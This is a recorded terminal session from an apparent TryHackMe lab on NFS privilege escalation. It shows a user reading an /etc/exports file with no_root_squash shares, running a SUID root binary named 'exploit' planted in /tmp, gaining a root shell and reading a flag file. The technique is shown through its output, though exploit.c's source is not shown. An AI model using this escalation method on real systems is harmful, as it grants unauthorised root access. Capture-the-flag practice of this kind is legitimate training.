@@ -1,0 +1,157 @@
+Script started on 2025-03-15 00:41:00+03:00 [COMMAND="ssh karen@linux.privesc.nfs.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'linux.privesc.nfs.thm (10.10.77.242)' can't be established.
+ED25519 key fingerprint is SHA256:iWFs1gyEO8aVwvRVbX3OOThmOy6BpFI+1x8SwFg2bts.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'linux.privesc.nfs.thm' (ED25519) to the list of known hosts.
+karen@linux.privesc.nfs.thm's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Mar 14 21:41:08 UTC 2025
+
+  System load:  0.0               Processes:             116
+  Usage of /:   4.6% of 29.02GB   Users logged in:       0
+  Memory usage: 52%               IPv4 address for eth0: 10.10.77.242
+  Swap usage:   0%
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sun Jun 20 18:06:49 2021 from 10.9.2.27
+Could not chdir to home directory /home/karen: No such file or directory
+$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+$ ls
+bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
+boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
+$ cd va     cd /home
+$ ls
+backup	matt  ubuntu
+$ cd backup
+-sh: 5: cd: can't cd to backup
+$ ls  cd /tmp
+$ ls
+snap.lxd
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-logind.service-QxACVh
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-resolved.service-4wjgCh
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-timesyncd.service-mFLYWg
+$ exit
+Connection to linux.privesc.nfs.thm closed.
+
+Script done on 2025-03-15 00:45:49+03:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2025-03-15 00:47:42+03:00 [COMMAND="ssh karen@linux.privesc.nfs.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+karen@linux.privesc.nfs.thm's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Mar 14 21:47:48 UTC 2025
+
+  System load:  0.0               Processes:             117
+  Usage of /:   4.6% of 29.02GB   Users logged in:       0
+  Memory usage: 52%               IPv4 address for eth0: 10.10.77.242
+  Swap usage:   0%
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Mar 14 21:41:09 2025 from 10.8.61.245
+Could not chdir to home directory /home/karen: No such file or directory
+$ cd /tmp
+$ ls
+exploit.c
+snap.lxd
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-logind.service-QxACVh
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-resolved.service-4wjgCh
+systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-timesyncd.service-mFLYWg
+$ ls -al
+total 64
+drwxrwxrwt 11 root   root    4096 Mar 14 21:50 .
+drwxr-xr-x 19 root   root    4096 Mar 14 20:01 ..
+drwxrwxrwt  2 root   root    4096 Mar 14 20:01 .ICE-unix
+drwxrwxrwt  2 root   root    4096 Mar 14 20:01 .Test-unix
+drwxrwxrwt  2 root   root    4096 Mar 14 20:01 .X11-unix
+drwxrwxrwt  2 root   root    4096 Mar 14 20:01 .XIM-unix
+drwxrwxrwt  2 root   root    4096 Mar 14 20:01 .font-unix
+-rwsr-sr-x  1 root   root   16056 Mar 14 21:50 exploit
+-rw-r--r--  1 ubuntu ubuntu   240 Mar 14 21:50 exploit.c
+drwx------  3 root   root    4096 Mar 14 20:01 snap.lxd
+drwx------  3 root   root    4096 Mar 14 20:01 systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-logind.service-QxACVh
+drwx------  3 root   root    4096 Mar 14 20:01 systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-resolved.service-4wjgCh
+drwx------  3 root   root    4096 Mar 14 20:01 systemd-private-609278cad583405a86a9d150b5a8ea2b-systemd-timesyncd.service-mFLYWg
+$ ./exploit
+./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
+$ ./exploit
+root@ip-10-10-77-242:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+root@ip-10-10-77-242:/tmp# find / -name flag7.txt -type f 2>/dev/bul[K[K[Knull
+/home/matt/flag7.txt
+root@ip-10-10-77-242:/tmp# cat /home/matt/flag7.txt
+THM-89384012
+root@ip-10-10-77-242:/tmp# Connection to linux.privesc.nfs.thm closed by remote host.
+Connection to linux.privesc.nfs.thm closed.
+
+Script done on 2025-03-15 01:10:13+03:00 [COMMAND_EXIT_CODE="255"]
